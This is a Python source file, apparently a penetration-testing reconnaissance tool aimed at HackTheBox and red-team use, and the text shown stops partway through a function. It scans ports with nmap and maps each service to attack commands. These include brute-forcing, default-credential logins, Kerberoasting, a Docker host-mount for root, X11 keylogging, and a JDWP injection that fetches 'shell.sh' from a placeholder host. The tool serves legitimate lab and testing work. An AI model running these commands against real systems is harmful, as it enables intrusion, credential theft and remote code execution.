#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  PHANTOM RECON v3.0 — GOD-TIER RECONNAISSANCE ENGINE           ║
║  Intelligent, visual, reactive port scanning pipeline           ║
║  by k41k35 — Optimized for HackTheBox & Red Team Ops                       ║
╚══════════════════════════════════════════════════════════════════╝

Flow:
  1. Host validation (ping + TCP connect)
  2. Adaptive rate calculation
  3. TCP full-port SYN scan (65535 ports)
  4. UDP top-100 scan (optional, skipped with --fast)
  5. Deep enumeration (-sC -sV) on discovered ports
  6. Domain intelligence (CN, DNS reverse, HTTP headers, redirects)
  7. Service enrichment (map services → attack vectors + commands)
  8. Reactive recon (spawn tools per service type: web, SMB, FTP, SNMP, etc.)
  9. Report generation (services.md + recon_summary.md)
  10. Timeline update
  11. Final dashboard
"""

import re
import sys
import os
from pathlib import Path
import shutil
import socket
import threading
import subprocess
import tempfile
import time
import xml.etree.ElementTree as ET
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from collections import OrderedDict

# ─── Rich imports (visual engine) ────────────────────────────────────────────
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.text import Text
    from rich.columns import Columns
    from rich import box
    from rich.markup import escape
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

console = Console() if HAS_RICH else None

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

SCRIPT_DIR = str(Path(__file__).resolve().parent)
VERSION = "3.0"
CODENAME = "PHANTOM RECON"

# ═══════════════════════════════════════════════════════════════════════════════
# SERVICE INTELLIGENCE DATABASE
# Maps nmap service names → attack vectors, commands, and auto-recon triggers
# ═══════════════════════════════════════════════════════════════════════════════

SERVICE_INTEL = {
    # ── Authentication / Remote Access ──
    "ssh": {
        "icon": "🔐", "risk": "LOW", "color": "green",
        "vectors": ["Version CVEs", "Brute-force", "Key reuse", "Username enumeration"],
        "commands": [
            "ssh-audit {target} -p {port}",
            "hydra -L users.txt -P passwords.txt ssh://{target} -s {port} -t 4",
        ],
        "notes": "Check version for CVEs (OpenSSH < 8.5 user enum). Look for keys/creds elsewhere.",
    },
    "telnet": {
        "icon": "📟", "risk": "HIGH", "color": "red",
        "vectors": ["Cleartext creds", "Brute-force", "Banner grab"],
        "commands": ["telnet {target} {port}"],
        "notes": "Cleartext protocol. Try common creds: admin:admin, root:root.",
    },
    # ── File Transfer ──
    "ftp": {
        "icon": "📂", "risk": "HIGH", "color": "yellow",
        "vectors": ["Anonymous login", "Version exploits", "File upload→RCE", "Bounce attack"],
        "commands": [
            "ftp {target} {port}  # try anonymous:anonymous",
            "nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p{port} {target}",
        ],
        "auto_recon": "ftp",
        "notes": "ALWAYS try anonymous login. Check for writable dirs + vsftpd 2.3.4 backdoor.",
    },
    "tftp": {
        "icon": "📦", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["Unauthenticated read/write", "Config file exfil"],
        "commands": [
            "tftp {target}  # then: get /etc/passwd",
            "nmap -sU --script tftp-enum -p{port} {target}",
        ],
        "notes": "No auth by default. Try reading config files, SSH keys, etc.",
    },
    # ── Web ──
    "http": {
        "icon": "🌐", "risk": "HIGH", "color": "cyan",
        "vectors": ["Directory fuzzing", "VHost discovery", "Web vulns", "Source code review"],
        "commands": ["feroxbuster -u http://{target}:{port}", "gobuster vhost -u http://{target}:{port}"],
        "auto_recon": "web",
        "notes": "Full web enum: dirs, vhosts, tech fingerprint, vulns.",
    },
    "https": {
        "icon": "🔒", "risk": "HIGH", "color": "cyan",
        "vectors": ["Directory fuzzing", "VHost discovery", "SSL/TLS vulns", "Cert intel"],
        "commands": ["feroxbuster -u https://{target}:{port} -k", "sslscan {target}:{port}"],
        "auto_recon": "web",
        "notes": "Check cert CN/SAN for domains. SSL vulns (Heartbleed, etc).",
    },
    "ssl/http": {
        "icon": "🔒", "risk": "HIGH", "color": "cyan",
        "vectors": ["Directory fuzzing", "VHost discovery", "SSL/TLS vulns", "Cert intel"],
        "commands": ["feroxbuster -u https://{target}:{port} -k"],
        "auto_recon": "web_ssl",
        "notes": "HTTPS service. Check cert CN/SAN for domains.",
    },
    # ── SMB / Windows ──
    "microsoft-ds": {
        "icon": "📁", "risk": "CRITICAL", "color": "red",
        "vectors": ["Null session", "Guest access", "EternalBlue", "Shares enum", "RID brute"],
        "commands": [
            "crackmapexec smb {target}",
            "smbclient -N -L //{target}",
            "enum4linux-ng {target}",
            "nmap --script smb-vuln* -p{port} {target}",
        ],
        "auto_recon": "smb",
        "notes": "Null/guest session → shares → sensitive files. Check for EternalBlue (MS17-010).",
    },
    "netbios-ssn": {
        "icon": "📁", "risk": "HIGH", "color": "red",
        "vectors": ["NetBIOS enum", "Shares", "Name resolution"],
        "commands": [
            "nbtscan {target}",
            "nmblookup -A {target}",
        ],
        "notes": "NetBIOS session. Enum names, workgroup, shares.",
    },
    # ── DNS ──
    "domain": {
        "icon": "🌍", "risk": "MEDIUM", "color": "blue",
        "vectors": ["Zone transfer (AXFR)", "Subdomain enum", "DNS cache snooping"],
        "commands": [
            "dig axfr @{target} {domain}",
            "dig any @{target} {domain}",
            "dnsrecon -d {domain} -n {target}",
        ],
        "auto_recon": "dns",
        "notes": "Try zone transfer FIRST. Enum subdomains via DNS.",
    },
    # ── SNMP ──
    "snmp": {
        "icon": "📡", "risk": "CRITICAL", "color": "red",
        "vectors": ["Community string brute", "System info leak", "Process list", "Credentials"],
        "commands": [
            "snmpwalk -v2c -c public {target}",
            "snmpbulkwalk -v2c -c public {target} NET-SNMP-EXTEND-MIB::nsExtendOutputFull",
            "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {target}",
        ],
        "auto_recon": "snmp",
        "notes": "GOLDMINE for CTF. Leaks processes, interfaces, users, sometimes creds.",
    },
    # ── LDAP ──
    "ldap": {
        "icon": "📋", "risk": "HIGH", "color": "yellow",
        "vectors": ["Anonymous bind", "User enum", "Password in description", "AS-REP roast"],
        "commands": [
            "ldapsearch -x -H ldap://{target} -b '' -s base namingcontexts",
            "ldapsearch -x -H ldap://{target} -b 'DC=domain,DC=local'",
            "nmap --script ldap-rootdse,ldap-search -p{port} {target}",
        ],
        "auto_recon": "ldap",
        "notes": "Anonymous bind → dump users → check descriptions for passwords.",
    },
    # ── Kerberos ──
    "kerberos-sec": {
        "icon": "🎫", "risk": "HIGH", "color": "magenta",
        "vectors": ["AS-REP Roasting", "Kerberoasting", "User enum"],
        "commands": [
            "kerbrute userenum -d {domain} --dc {target} users.txt",
            "impacket-GetNPUsers {domain}/ -no-pass -usersfile users.txt -dc-ip {target}",
            "impacket-GetUserSPNs {domain}/user:pass -dc-ip {target} -request",
        ],
        "notes": "Enum users. AS-REP roast users w/o preauth. Kerberoast SPN accounts.",
    },
    # ── RPC ──
    "msrpc": {
        "icon": "🔌", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["RPC enum", "User enum", "SID brute"],
        "commands": [
            "rpcclient -U '' -N {target}  # then: enumdomusers, enumdomgroups",
            "impacket-rpcdump {target}",
        ],
        "notes": "Null session RPC → user/group enum. SID brute for full user list.",
    },
    # ── Databases ──
    "mysql": {
        "icon": "🗄️", "risk": "HIGH", "color": "red",
        "vectors": ["Anonymous/root login", "UDF RCE", "File read/write"],
        "commands": [
            "mysql -h {target} -u root -p''",
            "nmap --script mysql-empty-password,mysql-info -p{port} {target}",
        ],
        "notes": "Try root with empty password. Check for FILE privilege → read/write.",
    },
    "ms-sql-s": {
        "icon": "🗃️", "risk": "HIGH", "color": "red",
        "vectors": ["Default creds", "xp_cmdshell RCE", "Linked servers"],
        "commands": [
            "crackmapexec mssql {target} -u sa -p ''",
            "impacket-mssqlclient sa@{target} -windows-auth",
            "nmap --script ms-sql-info,ms-sql-empty-password -p{port} {target}",
        ],
        "notes": "sa:sa or sa:empty. Enable xp_cmdshell for RCE.",
    },
    "postgresql": {
        "icon": "🐘", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["Default creds", "File read (COPY TO)", "RCE via extensions"],
        "commands": [
            "psql -h {target} -U postgres -p {port}",
        ],
        "notes": "Try postgres:postgres. COPY TO/FROM for file read. RCE via lo_import.",
    },
    "redis": {
        "icon": "🔴", "risk": "CRITICAL", "color": "red",
        "vectors": ["No auth", "RCE via modules", "SSH key injection", "Webshell write"],
        "commands": [
            "redis-cli -h {target} -p {port} INFO",
            "redis-cli -h {target} -p {port} CONFIG GET dir",
        ],
        "auto_recon": "redis",
        "notes": "Usually no auth. Write SSH keys or webshell for RCE.",
    },
    "mongodb": {
        "icon": "🍃", "risk": "HIGH", "color": "green",
        "vectors": ["No auth", "Database dump", "NoSQL injection"],
        "commands": [
            "mongosh --host {target} --port {port}  # then: show dbs",
        ],
        "notes": "Often no auth. Dump all collections for creds.",
    },
    # ── Email ──
    "smtp": {
        "icon": "📧", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["User enum (VRFY/EXPN)", "Open relay", "Email spoofing"],
        "commands": [
            "smtp-user-enum -M VRFY -U users.txt -t {target} -p {port}",
            "nmap --script smtp-enum-users,smtp-open-relay -p{port} {target}",
        ],
        "notes": "VRFY/EXPN for user enum. Check open relay.",
    },
    "pop3": {
        "icon": "📬", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["Brute-force", "Email retrieval"],
        "commands": ["hydra -L users.txt -P passwords.txt pop3://{target} -s {port}"],
        "notes": "Brute-force or use found creds. Read emails for intel.",
    },
    "imap": {
        "icon": "📫", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["Brute-force", "Email retrieval", "NTLM auth info"],
        "commands": ["hydra -L users.txt -P passwords.txt imap://{target} -s {port}"],
        "notes": "Brute-force or use found creds. Check for NTLM auth.",
    },
    # ── Remote Desktop / Management ──
    "ms-wbt-server": {
        "icon": "🖥️", "risk": "MEDIUM", "color": "blue",
        "vectors": ["BlueKeep (CVE-2019-0708)", "Brute-force", "NLA bypass"],
        "commands": [
            "nmap --script rdp-vuln-ms12-020,rdp-ntlm-info -p{port} {target}",
            "xfreerdp /v:{target}:{port} /u:user /p:pass",
        ],
        "notes": "Check for BlueKeep. Use found creds for access.",
    },
    # ── WinRM ──
    "wsman": {
        "icon": "⚡", "risk": "HIGH", "color": "magenta",
        "vectors": ["Remote code execution", "Password spray"],
        "commands": [
            "crackmapexec winrm {target} -u user -p password",
            "evil-winrm -i {target} -u user -p password",
        ],
        "auto_recon": "winrm",
        "notes": "WinRM = remote shell if you have valid creds. Spray with found users.",
    },
    # ── Rsync ──
    "rsync": {
        "icon": "🔄", "risk": "HIGH", "color": "yellow",
        "vectors": ["Anonymous sync", "File read/write", "SSH key overwrite"],
        "commands": [
            "rsync --list-only rsync://{target}:{port}/",
            "nmap --script rsync-list-modules -p{port} {target}",
        ],
        "auto_recon": "rsync",
        "notes": "Look for anonymous readable/writable modules. Rsync usually runs on port 873.",
    },
    # ── Java RMI / JDWP ──
    "jdwp": {
        "icon": "☕", "risk": "CRITICAL", "color": "red",
        "vectors": ["Remote Code Execution (RCE)"],
        "commands": [
            "nmap --script jdwp-exec,jdwp-info -p{port} {target}",
            "jdwp-shellifier -t {target} -p {port} --break-on 'java.lang.String.indexof' --cmd 'wget http://YOUR_IP/shell.sh'",
        ],
        "notes": "JDWP allows injecting classes and executing code directly on the JVM. RCE is almost guaranteed.",
    },
    # ── Docker API ──
    "docker": {
        "icon": "🐳", "risk": "CRITICAL", "color": "red",
        "vectors": ["Unauthenticated API", "Container breakout", "Host filesystem mount"],
        "commands": [
            "docker -H tcp://{target}:{port} ps",
            "docker -H tcp://{target}:{port} run -it -v /:/host/ ubuntu chroot /host/ bash",
        ],
        "notes": "Mount the host filesystem inside a container and chroot for instant root.",
    },
    # ── NFS ──
    "nfs": {
        "icon": "💾", "risk": "HIGH", "color": "red",
        "vectors": ["Mountable shares", "UID spoofing", "Sensitive file access"],
        "commands": [
            "showmount -e {target}",
            "nmap --script nfs-ls,nfs-showmount,nfs-statfs -p{port} {target}",
        ],
        "auto_recon": "nfs",
        "notes": "Check for world-readable shares. Mount and enumerate.",
    },
    # ── VNC ──
    "vnc": {
        "icon": "🖥️", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["No auth", "Weak password", "VNC auth bypass"],
        "commands": [
            "vncviewer {target}:{port}",
            "nmap --script vnc-info,vnc-brute -p{port} {target}",
        ],
        "notes": "Often no auth or weak password. Direct GUI access.",
    },
    # ── RPCbind / Portmapper ──
    "rpcbind": {
        "icon": "🔌", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["RPC service enum", "NFS discovery", "NIS"],
        "commands": [
            "rpcinfo -p {target}",
            "nmap --script rpcinfo,nfs-showmount -p{port} {target}",
        ],
        "notes": "Lists RPC services (NFS, NIS, mountd). Pivot to NFS shares.",
    },
    # ── Finger ──
    "finger": {
        "icon": "👉", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["User enumeration", "Info disclosure"],
        "commands": [
            "finger @{target}",
            "finger-user-enum.pl -U users.txt -t {target}",
            "nmap --script finger -p{port} {target}",
        ],
        "notes": "Enumerate valid users. Classic Solaris 'finger 0@host' info leak.",
    },
    # ── Ident ──
    "ident": {
        "icon": "🪪", "risk": "LOW", "color": "green",
        "vectors": ["Service-owner username disclosure"],
        "commands": ["nmap --script auth-owners -p{port} {target}"],
        "notes": "Reveals the OS user running each open TCP service. Map users to ports.",
    },
    # ── AJP (Tomcat) ──
    "ajp13": {
        "icon": "🐱", "risk": "HIGH", "color": "yellow",
        "vectors": ["Ghostcat (CVE-2020-1938)", "File read", "Tomcat proxy"],
        "commands": [
            "nmap --script ajp-headers,ajp-methods -p{port} {target}",
            "python3 ajpShooter.py http://{target} {port} /WEB-INF/web.xml read",
        ],
        "notes": "Ghostcat: read WEB-INF files (CVE-2020-1938). If app upload exists → RCE.",
    },
    # ── Elasticsearch ──
    "elasticsearch": {
        "icon": "🔎", "risk": "HIGH", "color": "red",
        "vectors": ["Unauthenticated REST API", "Data dump", "CVE-2015-1427 RCE"],
        "commands": [
            "curl -s http://{target}:{port}/_cat/indices?v",
            "curl -s http://{target}:{port}/_search?pretty",
        ],
        "notes": "Often no auth. Dump all indices for creds/PII. Old versions → RCE.",
    },
    # ── Memcached ──
    "memcached": {
        "icon": "🧠", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["No auth", "Data dump", "Cache poisoning"],
        "commands": [
            "memcstat --servers={target}:{port}",
            "nmap --script memcached-info -p{port} {target}",
        ],
        "notes": "No auth by default. Dump keys/slabs for session tokens and creds.",
    },
    # ── Oracle TNS ──
    "oracle-tns": {
        "icon": "🛢️", "risk": "HIGH", "color": "red",
        "vectors": ["SID brute", "Default creds", "TNS poisoning"],
        "commands": [
            "nmap --script oracle-sid-brute,oracle-tns-version -p{port} {target}",
            "odat all -s {target} -p {port}",
        ],
        "notes": "Brute the SID first, then default creds (scott:tiger, system:manager).",
    },
    # ── Java RMI ──
    "java-rmi": {
        "icon": "☕", "risk": "CRITICAL", "color": "red",
        "vectors": ["Insecure deserialization", "RCE", "Registry enum"],
        "commands": [
            "nmap --script rmi-dumpregistry,rmi-vuln-classloader -p{port} {target}",
            "java -jar BaRMIe.jar enum {target} {port}",
            "java -jar ysoserial.jar CommonsCollections6 'cmd' | ...",
        ],
        "notes": "Enumerate registry, then deserialization gadget → RCE (ysoserial).",
    },
    "rmiregistry": {
        "icon": "☕", "risk": "CRITICAL", "color": "red",
        "vectors": ["Insecure deserialization", "RCE", "Registry enum"],
        "commands": [
            "nmap --script rmi-dumpregistry,rmi-vuln-classloader -p{port} {target}",
            "java -jar BaRMIe.jar enum {target} {port}",
        ],
        "notes": "Java RMI registry. Dump bound objects, attempt deserialization RCE.",
    },
    # ── CouchDB ──
    "couchdb": {
        "icon": "🛋️", "risk": "HIGH", "color": "red",
        "vectors": ["Unauth API", "CVE-2017-12635 priv esc", "Data dump"],
        "commands": [
            "curl -s http://{target}:{port}/_all_dbs",
            "curl -s http://{target}:{port}/_users/_all_docs?include_docs=true",
        ],
        "notes": "Check _all_dbs unauthenticated. CVE-2017-12635 → create admin user.",
    },
    # ── X11 ──
    "x11": {
        "icon": "🪟", "risk": "HIGH", "color": "yellow",
        "vectors": ["Unauthenticated display", "Keylogging", "Screenshot"],
        "commands": [
            "nmap --script x11-access -p{port} {target}",
            "xwd -root -display {target}:0 -out /tmp/screen.xwd",
            "xspy {target}:0",
        ],
        "notes": "If 'X11 access granted' → screenshot the desktop and log keystrokes.",
    },
    # ── Global Catalog (AD) ──
    "globalcatLDAP": {
        "icon": "📋", "risk": "HIGH", "color": "yellow",
        "vectors": ["Anonymous bind", "AD user/group enum", "BloodHound"],
        "commands": [
            "ldapsearch -x -H ldap://{target}:{port} -b '' -s base namingcontexts",
            "bloodhound-python -d {domain} -u user -p pass -ns {target} -c all",
        ],
        "auto_recon": "ldap",
        "notes": "AD Global Catalog. Anonymous bind → enumerate the whole forest.",
    },
    # ── WinRM (HTTP transport name) ──
    "http-rpc-epmap": {
        "icon": "🔌", "risk": "MEDIUM", "color": "yellow",
        "vectors": ["RPC endpoint mapper", "Service enum"],
        "commands": ["impacket-rpcdump {target}"],
        "notes": "RPC endpoint mapper. Enumerate exposed RPC interfaces.",
    },
}


# Alias mapping: nmap reports various names for the same service
SERVICE_ALIASES = {
    "http-proxy": "http", "http-alt": "http", "sun-answerbook": "http",
    "rtsp": "http", "ssl/https": "https",
    "netbios-ssn": "netbios-ssn", "smb": "microsoft-ds",
    "ms-sql": "ms-sql-s", "mssql": "ms-sql-s",
    "ntp": None, "tcpwrapped": None,
    "ajp13": "ajp13",
    "mariadb": "mysql",
    "ms-wbt-server": "ms-wbt-server",
    "ldapssl": "ldap", "ldaps": "ldap",
    "globalcatLDAPssl": "globalcatLDAP",
    "ssl/ldap": "ldap",
    "imaps": "imap", "pop3s": "pop3", "smtps": "smtp",
    "iss-realsecure": "ms-sql-s",
    "microsoft-rdp": "ms-wbt-server", "rdp": "ms-wbt-server",
    "sunrpc": "rpcbind", "portmapper": "rpcbind",
    "msrpc": "msrpc",
    "vnc-http": "http",
    "ssl/unknown": "https",
}

# Common web ports (if nmap didn't detect as http/https)
WEB_PORT_DEFAULTS = {80, 443, 3000, 4443, 5000, 8000, 8080, 8443, 8888, 9000, 9090, 9443}


# ═══════════════════════════════════════════════════════════════════════════════
# VISUAL ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

SKULL_BANNER = r"""
[bold magenta]    ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗[/]
[bold magenta]    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║[/]
[bold cyan]    ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║[/]
[bold cyan]    ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║[/]
[bold blue]    ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║[/]
[bold blue]    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝[/]
"""

def print_banner(target, mode):
    """Print the ASCII art banner with target info."""
    if not HAS_RICH:
        print(f"\033[1;35m[💀] PHANTOM RECON ENGINE v{VERSION} → {target}\033[0m")
        return
    console.print(SKULL_BANNER)
    console.print(Panel.fit(
        f"[bold gold1]PHANTOM RECON ENGINE[/] v{VERSION} — [italic grey50]{CODENAME}[/]\n"
        f"[bold cyan]Target:[/] {target}  │  [bold cyan]Mode:[/] {mode}\n"
        f"[grey50]{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}[/]",
        border_style="bright_magenta", box=box.DOUBLE_EDGE
    ))


def phase_header(num, total, title, icon=""):
    """Print a phase header with numbering."""
    if HAS_RICH:
        console.print(f"\n[bold cyan]━━━ {icon} PHASE {num}/{total}: {title} ━━━[/]")
    else:
        print(f"\n\033[1;36m━━━ {icon} PHASE {num}/{total}: {title} ━━━\033[0m")


def phase_result(message, style="green"):
    """Print a phase result."""
    if HAS_RICH:
        console.print(f"  [bold {style}]→ {message}[/]")
    else:
        print(f"  → {message}")


def phase_timing(elapsed):
    """Print elapsed time for a phase."""
    if HAS_RICH:
        console.print(f"  [grey50]⏱  {elapsed:.1f}s[/]")
    else:
        print(f"  ⏱  {elapsed:.1f}s")


# ═══════════════════════════════════════════════════════════════════════════════
# TERMINAL SPAWNING
# ═══════════════════════════════════════════════════════════════════════════════

# Directory where per-tab launcher scripts are written.
# Use a per-user dir (macOS $TMPDIR is already user-scoped, e.g.
# /var/folders/.../T/) so launchers never collide with root-owned files left
# behind by a previous `sudo` run in a shared /tmp.
# os.getuid() is POSIX-only; fall back to the username on Windows so the module
# imports cleanly everywhere. tempfile.gettempdir() honours TMPDIR/TEMP per-OS.
_RECON_UID = (
    os.getuid() if hasattr(os, "getuid")
    else os.environ.get("USERNAME", "user")
)
TAB_LAUNCHER_DIR = os.path.join(
    tempfile.gettempdir(), f"recon_tabs_{_RECON_UID}"
)


def _build_launcher(name, command):
    """Write a launcher script that titles the tab, runs the command, and keeps
    the tab open with the title pinned. Returns the launcher path."""
    os.makedirs(TAB_LAUNCHER_DIR, exist_ok=True)

    safe_name = re.sub(r"[^\w\-.+ ]", "", name).strip() or "recon"
    # Title shown while the tool runs and after it finishes (✓ when done)
    title_run = f"⚡ {safe_name}"
    title_done = f"✓ {safe_name}"

    # Disable Ghostty's auto-title shell feature so OUR tab name survives the
    # interactive prompt that follows the tool (otherwise it reverts to cwd).
    feats = os.environ.get("GHOSTTY_SHELL_FEATURES", "cursor:blink,path,title")
    feats_no_title = ",".join(f for f in feats.split(",") if f.strip() != "title")

    fd, path = tempfile.mkstemp(
        prefix=f"{safe_name.replace(' ', '_')}_", suffix=".sh", dir=TAB_LAUNCHER_DIR
    )
    with os.fdopen(fd, "w") as f:
        f.write("#!/bin/zsh\n")
        f.write(f"printf '\\033]0;{title_run}\\007'\n")
        f.write('printf "\\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\033[0m\\n"\n')
        f.write(f'printf "\\033[1;35m ▸ \\033[1;36m{safe_name}\\033[0m\\n"\n')
        f.write('printf "\\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\033[0m\\n\\n"\n')
        f.write(f"{command}\n")
        f.write("__rc=$?\n")
        f.write(f'printf "\\n\\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\033[0m\\n"\n')
        f.write('if [ $__rc -eq 0 ]; then\n')
        f.write(f'  printf "\\033[1;32m ✓ {safe_name} — terminado\\033[0m\\n"\n')
        f.write("else\n")
        f.write(f'  printf "\\033[1;31m ✗ {safe_name} — código $__rc\\033[0m\\n"\n')
        f.write("fi\n")
        f.write(f"printf '\\033]0;{title_done}\\007'\n")
        f.write(f'export GHOSTTY_SHELL_FEATURES="{feats_no_title}"\n')
        f.write("exec zsh -i\n")
    os.chmod(path, 0o755)
    return path


def _spawn_ghostty_tab(name, command):
    """Open a NEW TAB (like Cmd+T) in the current Ghostty window and run command.

    Uses System Events to send super+t (Ghostty's new_tab keybind) then types the
    launcher path. Requires Accessibility permission for the terminal.

    Retries on the transient -609 ("connection is invalid") error that System
    Events throws when it has not been used yet in the session.
    """
    launcher = _build_launcher(name, command)
    osa = (
        'tell application "Ghostty" to activate\n'
        'delay 0.4\n'
        'tell application "System Events"\n'
        '    keystroke "t" using command down\n'
        '    delay 0.55\n'
        f'    keystroke "zsh \'{launcher}\'"\n'
        '    key code 36\n'
        'end tell\n'
    )

    # Warm up System Events so the first real call doesn't hit -609
    subprocess.run(
        ["osascript", "-e", 'tell application "System Events" to launch'],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    last_err = ""
    for attempt in range(3):
        r = subprocess.run(["osascript", "-e", osa], capture_output=True, text=True)
        if r.returncode == 0:
            return True
        last_err = (r.stderr or "").strip()
        # -609 = connection invalid (transient): retry. Other errors: give up.
        if "-609" not in last_err:
            break
        time.sleep(0.6)

    if HAS_RICH and last_err:
        console.print(f"[yellow]  ⚠ No se pudo abrir pestaña ({name}): {last_err}[/]")
    return False


def spawn_terminal(name, command):
    """Spawns a new TAB (not a window) for a recon tool and titles it with `name`.

    Order of preference:
      1. Inside tmux  → tmux new-window (already a tab)
      2. Inside Ghostty → Cmd+T tab via AppleScript, title pinned to `name`
      3. Fallback     → new Ghostty window via -e
    """
    # Resolve script paths
    command = command.replace("ferodir", f"{SCRIPT_DIR}/ferodir.sh")
    command = command.replace("govhost", f"{SCRIPT_DIR}/govhost.sh")

    # 1. tmux: a window IS a tab, and -n sets its name
    if os.environ.get("TMUX"):
        subprocess.run(
            f"tmux new-window -n '{name}' 'zsh -i -c \"{command}; exec zsh\"'",
            shell=True
        )
        return

    # 2. Ghostty: open a real tab via Cmd+T
    in_ghostty = os.environ.get("TERM_PROGRAM") == "ghostty" or os.path.exists(
        "/Applications/Ghostty.app/Contents/MacOS/ghostty"
    )
    if in_ghostty and shutil.which("osascript"):
        if _spawn_ghostty_tab(name, command):
            return  # tab opened successfully

    # 3. Fallback: cross-platform terminals or headless background execution
    shell_bin = shutil.which("zsh") or shutil.which("bash") or "/bin/sh"
    full_cmd = f"{command}; exec /bin/zsh"
    term_launched = False

    if sys.platform == "darwin":
        ghostty_bin = "/Applications/Ghostty.app/Contents/MacOS/ghostty"
        if os.path.exists(ghostty_bin):
            subprocess.Popen(
                [ghostty_bin, "-e", shell_bin, "-i", "-c", full_cmd],
                start_new_session=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL
            )
            term_launched = True
        elif shutil.which("osascript"):
            osa_term = f'tell application "Terminal" to do script "{command}"'
            subprocess.run(["osascript", "-e", osa_term], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            term_launched = True
    elif os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY"):
        for term in ["x-terminal-emulator", "gnome-terminal", "xfce4-terminal", "konsole", "kitty", "alacritty", "xterm"]:
            term_path = shutil.which(term)
            if term_path:
                if term in ("gnome-terminal", "xfce4-terminal"):
                    subprocess.Popen([term_path, "--", shell_bin, "-c", full_cmd], start_new_session=True)
                else:
                    subprocess.Popen([term_path, "-e", shell_bin, "-c", full_cmd], start_new_session=True)
                term_launched = True
                break

    if not term_launched:
        log_path = f"/tmp/phantom_{name}_{int(time.time())}.log"
        with open(log_path, "w") as log_f:
            subprocess.Popen([shell_bin, "-c", command], stdout=log_f, stderr=log_f, start_new_session=True)
        if HAS_RICH:
            console.print(f"  [grey50]⚡ Recon background worker for [bold]{name}[/]: logging to {log_path}[/]")


# ═══════════════════════════════════════════════════════════════════════════════
# CORE SCANNING FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def check_host_alive(target):
    """Quick host validation: ICMP ping + TCP connect to common ports."""
    # Try ping first (2 packets, 2s timeout)
    try:
        p = subprocess.run(
            ["ping", "-c", "1", "-t", "2", target],
            capture_output=True, text=True, timeout=3
        )
        if p.returncode == 0:
            return True, "ICMP"
    except Exception:
        pass

    # Fallback: TCP connect to common ports (Added RDP, WinRM, RPC for Windows bypass)
    for port in [80, 443, 22, 445, 21, 3389, 5985, 135]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            result = s.connect_ex((target, port))
            s.close()
            if result == 0:
                return True, f"TCP/{port}"
        except Exception:
            pass

    return False, None


def get_adaptive_rate(target):
    """Calculate safe send rate based on network latency."""
    try:
        p = subprocess.run(
            ["ping", "-c", "2", "-t", "2", target],
            capture_output=True, text=True, timeout=5
        )
        rtt_line = [l for l in p.stdout.split('\n') if 'round-trip' in l or 'rtt' in l]
        if rtt_line:
            parts = rtt_line[0].split('=')
            if len(parts) >= 2:
                values = parts[1].strip().split('/')
                if len(values) >= 2:
                    avg_rtt = float(values[1].replace('ms', '').strip())
                    if avg_rtt > 150.0:
                        return "2500", avg_rtt
                    elif avg_rtt > 80.0:
                        return "4000", avg_rtt
                    else:
                        return "5000", avg_rtt
        return "3000", -1
    except Exception:
        return "3000", -1


def parse_open_ports(grepable, proto):
    """Extract open ports from nmap greppable output."""
    found = []
    for m in re.finditer(r"(\d+)/open(?:\|filtered)?/" + proto, grepable):
        found.append(m.group(1))
    return list(dict.fromkeys(found))  # dedup preserving order


def update_etc_hosts(target, domains):
    """Map detected domains to target in /etc/hosts (idempotent)."""
    domains = list(dict.fromkeys(d for d in domains if d))
    if not domains:
        return
    for dom in domains:
        escaped_dom = dom.replace('.', r'\.')
        subprocess.run(f"sudo sed -i '.bak' -E '/[[:space:]]{escaped_dom}([[:space:]]|$)/d' /etc/hosts", shell=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    entry = f"{target} {' '.join(domains)}\n"
    subprocess.run(["sudo", "tee", "-a", "/etc/hosts"], input=entry.encode(),
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def dns_reverse_lookup(target):
    """Attempt DNS reverse lookup to discover hostname."""
    try:
        result = socket.gethostbyaddr(target)
        if result and result[0]:
            return result[0]
    except Exception:
        pass
    # Try dig -x as fallback
    try:
        p = subprocess.run(
            ["dig", "+short", "-x", target],
            capture_output=True, text=True, timeout=5
        )
        hostname = p.stdout.strip().rstrip(".")
        if hostname and not hostname.startswith(";"):
